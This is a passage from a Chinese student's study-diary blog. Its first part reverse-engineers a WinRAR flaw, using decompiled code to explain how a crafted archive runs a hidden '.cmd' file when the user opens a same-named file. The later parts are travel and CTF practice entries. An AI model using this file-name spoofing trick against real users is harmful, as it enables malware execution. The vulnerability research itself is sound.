punctuation">.</span><span class="token punctuation">.</span>  deFileName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> WCHAR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          click_name <span class="token operator">=</span> <span class="token function">sub_1400AC0CC</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">compare</span><span class="token punctuation">(</span>click_name<span class="token punctuation">,</span> deFileName<span class="token punctuation">,</span> a4<span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最重要的部分：<code>compare</code>函数，比较的逻辑是<code>click_name</code>与<code>deFileName</code>或<code>deFileName\\\\</code>或<code>deFileName/</code>相同都可以匹配成功，即匹配同名的文件或文件夹，而释放的时候遇到文件夹会将文件夹下的所有文件释放的临时目录，因此点击<code>poc.txt</code> 的时候匹配到<code>poc.txt</code> 和<code>poc.txt \\</code>，从而释放了<code>poc.txt</code> 以及<code>poc.txt \\poc.txt .cmd</code> ，释放的同时会保存文件路径，作为后续执行函数的参数结构体的<code>lpFile</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x140089948</span><span class="token keyword">char</span> __fastcall <span class="token function">compare</span><span class="token punctuation">(</span>WCHAR <span class="token operator">*</span>click_name<span class="token punctuation">,</span> WCHAR <span class="token operator">*</span>deFileName<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v7 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i64<span class="token punctuation">;</span>    tName_len <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i64<span class="token punctuation">;</span>    <span class="token keyword">do</span>      <span class="token operator">++</span>tName_len<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> click_name<span class="token punctuation">[</span>tName_len<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3 <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>        v9 <span class="token operator">=</span> <span class="token function">sub_1400AF168</span><span class="token punctuation">(</span>click_name<span class="token punctuation">,</span> deFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>        v9 <span class="token operator">=</span> <span class="token function">wcsncmp</span><span class="token punctuation">(</span>click_name<span class="token punctuation">,</span> deFileName<span class="token punctuation">,</span> tName_len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v9 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        tail <span class="token operator">=</span> deFileName<span class="token punctuation">[</span>tName_len<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> tail <span class="token operator">==</span> <span class="token char">'\\\\'</span> <span class="token operator">||</span> tail <span class="token operator">==</span> <span class="token char">'/'</span> <span class="token operator">||</span> <span class="token operator">!</span>tail <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取点击的文件名"><a href="#获取点击的文件名" class="headerlink" title="获取点击的文件名"></a>获取点击的文件名</h3><p><code>WinMain</code>中循环调用<code>process_message</code>处理消息</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x140102524</span><span class="token keyword">int</span> __stdcall <span class="token function">WinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nShowCmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">process_message</span><span class="token punctuation">(</span><span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span> <span class="token punctuation">)</span>                    <span class="token punctuation">;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>process_message</code> 获取消息并且根据不同的消息值进行不同的操作，除了<code>message=0x100/0x205/0xA5/0x203</code>，其他值会跳转到<code>LABEL_63</code>执行<code>DispatchMessageW</code>。当<code>Msg.message==0x201</code>即获取到鼠标左击的消息时通过<code>USER32.dll</code>中的函数进行一系列处理，获取左击的文件，即<code>click_name</code></p><blockquote><p>当光标位于窗口工作区中并且用户按下鼠标左键时发布。 如果未捕获鼠标，则消息将发布到光标下方的窗口。 否则，消息将发布到捕获了鼠标的窗口。<code>#define WM_LBUTTONDOWN    0x0201</code></p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x140101938</span>bool __fastcall <span class="token function">process_message</span><span class="token punctuation">(</span>HWND hDlg<span class="token punctuation">,</span> HWND hWnd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  MessageW <span class="token operator">=</span> <span class="token function">GetMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> MessageW <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>Msg<span class="token punctuation">.</span>hwnd <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>LABEL_63<span class="token operator">:</span>      <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">DispatchMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_64<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_14018A7E0 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token keyword">goto</span> LABEL_63<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p><code>USER32.dll</code> 处理完点击文件消息获取<code>click_name</code> 后继续处理消息，<code>sub_1400FFEF0→sub_140059AC0→process4(sub_140059574 )</code></p><p><code>process4</code>函数调用了<code>call_Release</code>函数进行释放，接着调用<code>sub_140106678</code>进一步调用到执行的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x140059574</span><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">process4</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_14018A804 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">call_Release</span><span class="token punctuation">(</span>v24<span class="token punctuation">,</span> <span class="token number">2048</span>i64<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">sub_14006246C</span><span class="token punctuation">(</span><span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">||</span> v4 <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v16<span class="token punctuation">)</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span>          <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">=</span> byte_14018A804<span class="token punctuation">;</span>          <span class="token function">sub_140106678</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_14018B87C<span class="token punctuation">,</span> v24<span class="token punctuation">,</span> v15<span class="token punctuation">,</span> v16<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过<code>sub_140106678→sub_140103668→Execute</code> 最终调用到<code>ShellExecuteExW</code> 执行文件，其中结构体<code>SHELLEXECUTEINFOW pExecInfo</code> 的参数<code>lpFile</code>即为要执行的文件路径</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> __fastcall <span class="token function">Execute</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">const</span> WCHAR <span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">const</span> WCHAR <span class="token operator">*</span>a3<span class="token punctuation">,</span> <span class="token keyword">const</span> WCHAR <span class="token operator">*</span>a4<span class="token punctuation">,</span> <span class="token keyword">char</span> a5<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a6<span class="token punctuation">,</span> <span class="token keyword">const</span> WCHAR <span class="token operator">*</span>a7<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  SHELLEXECUTEINFOW pExecInfo<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-E0h] BYREF</span>  <span class="token keyword">char</span> Buffer<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-70h] BYREF</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> pExecInfo<span class="token punctuation">.</span>lpVerb <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      pExecInfo<span class="token punctuation">.</span>lpVerb <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>      v12 <span class="token operator">=</span> <span class="token function">ShellExecuteExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pExecInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到传入的就是<code>poc.txt</code>  ，而最后执行的是<code>poc.txt \\poc.txt .cmd</code> ，需要进一步分析<code>ShellExecuteExW</code>，该函数位于<code>SHELL32.dll</code> ，调试的时候会自动下载调试符号</p><p><code>ShellExecuteExW</code> 执行过程：借个图</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">shlwapi_PathFileExistsAndAttributesW</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _DWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ebp</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// eax</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-268h] BYREF</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-260h] BYREF</span>  __int128 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-258h]</span>  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-248h]</span>  __int128 v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-240h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-230h] BYREF</span>  <span class="token keyword">char</span> v15<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-228h] BYREF</span>  v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token punctuation">)</span>    <span class="token operator">*</span>a2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">)</span>kernelbase_SetErrorMode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">)</span>kernelbase_GetFileAttributesW<span class="token punctuation">)</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token punctuation">)</span>      <span class="token operator">*</span>a2 <span class="token operator">=</span> v6<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span>      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">)</span>kernelbase_PathIsUNCServerW<span class="token punctuation">)</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span>       <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">)</span>kernelbase_PathIsUNCServerShareW<span class="token punctuation">)</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v10 <span class="token operator">=</span> <span class="token number">2</span>i64<span class="token punctuation">,</span>           v12 <span class="token operator">=</span> a1<span class="token punctuation">,</span>           v14 <span class="token operator">=</span> <span class="token number">512</span><span class="token punctuation">,</span>           v9 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">,</span>           v11 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">,</span>           v13 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">,</span>           <span class="token punctuation">(</span>v8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>unk_7FFA77D8B3AD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v10<span class="token punctuation">,</span> v15<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v14<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>       <span class="token operator">||</span> v8 <span class="token operator">==</span> <span class="token number">234</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">)</span><span class="token punctuation">)</span>kernelbase_SetErrorMode<span class="token punctuation">)</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>__fastcall <span class="token function">kernelbase_PathFindExtensionW</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> __int16 v5<span class="token punctuation">;</span> <span class="token comment">// cx</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  v3 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">>=</span> a1 <span class="token operator">+</span> <span class="token number">0x10000</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1                              <span class="token operator">+</span> <span class="token number">2</span>i64                              <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>kernelbase_lstrlenW<span class="token punctuation">)</span><span class="token punctuation">(</span>                                       a1<span class="token punctuation">,</span>                                       v3<span class="token punctuation">,</span>                                       v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>result <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x5Cu</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">46</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token char">'\\\\'</span> <span class="token operator">||</span> v5 <span class="token operator">==</span> <span class="token char">' '</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v2 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">++</span>result <span class="token operator">>=</span> v3 <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1                                <span class="token operator">+</span> <span class="token number">2</span>i64                                <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>kernelbase_lstrlenW<span class="token punctuation">)</span><span class="token punctuation">(</span>                                         a1<span class="token punctuation">,</span>                                         v3<span class="token punctuation">,</span>                                         v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token punctuation">)</span>    <span class="token keyword">return</span> v2<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-23"><a href="#7-23" class="headerlink" title="#7.23"></a>#7.23</h2><p>被电脑祭天搞怕了，清理了一天手机电脑，备份之后写了个新生手册准备招新（救命高中语文学了全忘了已经不会措辞了。噢还写了个题但是没写出来呜呜</p><h2 id="7-24"><a href="#7-24" class="headerlink" title="#7.24"></a>#7.24</h2><p>改队规，补之前的日报…做了很多杂事嗯，不一一列举啦，明天开始把winrar分析完然后准备出去旅游啦，旅游的时候有时间继续逆向</p><h2 id="7-25-8-7"><a href="#7-25-8-7" class="headerlink" title="#7.25-#8.7"></a>#7.25-#8.7</h2><p>逆向卡在一个循环…这段时间主要是陪宝宝然后去西安和上海旅游啦，那就浅浅记录一下吧</p><h3 id="7-25-7-28"><a href="#7-25-7-28" class="headerlink" title="7.25-7.28"></a>7.25-7.28</h3><p>宝宝从广州特地来盐城找我玩了四天，提前给他准备了点生日惊喜嘿嘿，第一次打气球，尽力了orz</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E7%94%9F%E6%97%A51.jpg" class><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E7%94%9F%E6%97%A52.jpg" class><p>一起去吃了889的自助牛排和宝龙的奎梨烤肉，去五洲国际看了《你的名字》，去吃了盐城鸡蛋饼，还去实验室玩了一圈，期待下次见面</p><h3 id="7-29-8-7"><a href="#7-29-8-7" class="headerlink" title="7.29-8.7"></a>7.29-8.7</h3><p>去西安旅游，玩了很多地方，最后去上海看了柯南30周年展。自从上了高中疫情之后也是四年没有旅游过啦，以后估计也很难又机会旅游。虽然耽误了很多学习时间，但感觉还不错。</p><p>华山、大唐芙蓉园</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E5%8D%8E%E5%B1%B1.jpg" class><p>大唐不夜城</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E8%A5%BF%E5%AE%891.jpg" class><p>骡马市步行街</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E8%A5%BF%E5%AE%892.jpg" class><p>陕西历史博物馆、秦始皇陵</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E8%A5%BF%E5%AE%893.jpg" class><p>柯南30周年展</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E6%9F%AF%E5%8D%97%E5%B1%95.jpg" class><h2 id="8-8"><a href="#8-8" class="headerlink" title="#8.8"></a>#8.8</h2><p>今天补觉补了挺久…睡醒补了前面的日报，写了一道爆破<code>canary</code>的题，然后收拾房间（为什么我的房间这么多东西！！）。题目就不放了</p><h2 id="8-9"><a href="#8-9" class="headerlink" title="#8.9"></a>#8.9</h2><p>复现<code>2024</code>极客少年的<code>pwn</code>，重学了一下<code>house of 